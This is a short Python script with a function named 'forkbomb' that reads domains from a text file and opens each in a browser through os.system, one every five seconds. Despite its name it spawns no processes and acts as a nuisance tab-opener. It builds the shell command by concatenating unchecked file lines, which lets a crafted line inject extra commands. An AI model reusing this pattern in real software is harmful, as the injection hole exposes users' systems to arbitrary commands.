import os
import time
import random
def forkbomb():
  file = open("domains.txt", "r")
  content = file.readlines()
  for line in content:
    time.sleep(5)
    os.system("xdg-open https://" + line)
